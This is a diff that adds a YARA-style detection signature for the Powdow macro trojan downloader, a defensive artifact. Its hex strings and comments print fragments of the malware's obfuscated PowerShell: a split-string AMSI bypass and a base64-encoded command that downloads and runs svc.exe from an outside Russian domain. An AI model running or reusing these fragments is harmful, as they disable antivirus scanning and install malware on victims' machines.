@@ -1,0 +1,13 @@
+
+rule TrojanDownloader_O97M_Powdow_SSD_MTB{
+	meta:
+		description = "TrojanDownloader:O97M/Powdow.SSD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
+		
+	strings :
+		$a_01_0 = {50 6f 77 65 72 73 68 65 6c 6c 20 2d 43 20 24 46 45 49 66 77 75 69 6f 65 68 66 61 69 77 79 59 4f 45 54 57 54 52 75 77 79 65 20 3d 20 27 61 27 2b 27 6d 73 27 2b 27 69 49 27 2b 27 6e 69 27 2b 27 74 46 27 2b 27 61 27 3b 20 24 45 46 38 30 33 34 75 6f 77 69 65 79 70 6f 77 69 75 65 20 3d 20 27 69 6c 27 2b 27 65 64 27 3b 20 24 43 65 6f 69 75 77 6a 6f 65 75 79 66 77 20 3d 20 27 53 79 27 2b 27 73 74 27 2b 27 65 6d 2e 4d 61 27 2b 27 6e 61 27 2b 27 67 65 6d 27 2b 27 65 6e 74 2e 27 2b 27 41 75 74 27 2b 27 6f 6d 61 74 27 2b 27 69 6f 27 2b 27 6e 2e 41 27 2b 27 6d 73 27 2b 27 69 55 74 27 2b 27 69 6c 73 27 3b } //1 Powershell -C $FEIfwuioehfaiwyYOETWTRuwye = 'a'+'ms'+'iI'+'ni'+'tF'+'a'; $EF8034uowieypowiue = 'il'+'ed'; $Ceoiuwjoeuyfw = 'Sy'+'st'+'em.Ma'+'na'+'gem'+'ent.'+'Aut'+'omat'+'io'+'n.A'+'ms'+'iUt'+'ils';
+		$a_01_1 = {5b 54 65 78 74 2e 45 6e 63 6f 64 69 6e 67 5d 3a 3a 55 74 66 38 2e 47 65 74 53 74 72 69 6e 67 28 5b 43 6f 6e 76 65 72 74 5d 3a 3a 46 72 6f 6d 42 61 73 65 36 34 53 74 72 69 6e 67 28 27 4a 46 56 56 56 53 41 39 49 43 64 6f 64 48 52 77 63 7a 6f 76 4c 32 56 34 63 47 56 79 64 48 42 79 62 32 31 76 64 47 6c 76 62 6e 4d 75 63 6e 55 76 5a 6d 6c 73 5a 58 4d 76 63 33 5a 6a 4c 6d 56 34 5a 53 63 37 49 43 52 51 55 46 41 67 50 53 41 6e 51 7a 70 63 56 58 4e 6c 63 6e 4e 63 55 48 56 69 62 47 6c 6a 58 48 4e 32 59 79 35 6c 65 47 55 6e 4f 79 41 6b 56 31 64 58 49 44 30 67 54 6d 56 33 4c 55 39 69 61 6d 56 6a 64 43 42 54 65 58 4e 30 5a 57 30 75 54 6d 56 30 4c 6c 64 6c 59 6b 4e 73 61 57 56 } //1 [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JFVVVSA9ICdodHRwczovL2V4cGVydHByb21vdGlvbnMucnUvZmlsZXMvc3ZjLmV4ZSc7ICRQUFAgPSAnQzpcVXNlcnNcUHVibGljXHN2Yy5leGUnOyAkV1dXID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWV
+		$a_01_2 = {75 64 44 73 67 4a 46 64 58 56 79 35 45 62 33 64 75 62 47 39 68 5a 45 5a 70 62 47 55 6f 4a 46 56 56 56 53 77 67 4a 46 42 51 55 43 6b 37 49 46 4e 30 59 58 4a 30 4c 56 42 79 62 32 4e 6c 63 33 4d 67 4c 55 5a 70 62 47 56 51 59 58 52 6f 49 43 52 51 55 46 41 37 27 29 29 3b 20 24 43 43 43 20 3d 20 5b 43 6f 6e 76 65 72 74 5d 3a 3a 54 6f 42 61 73 65 36 34 53 74 72 69 6e 67 28 5b 54 65 78 74 2e 45 6e 63 6f 64 69 6e 67 5d 3a 3a 55 6e 69 63 6f 64 65 2e 47 65 74 42 79 74 65 73 28 24 42 42 42 29 29 3b 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 20 24 43 43 43 3b } //1 udDsgJFdXVy5Eb3dubG9hZEZpbGUoJFVVVSwgJFBQUCk7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRQUFA7')); $CCC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BBB)); powershell -E $CCC;
+	condition:
+		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
+ 
+}
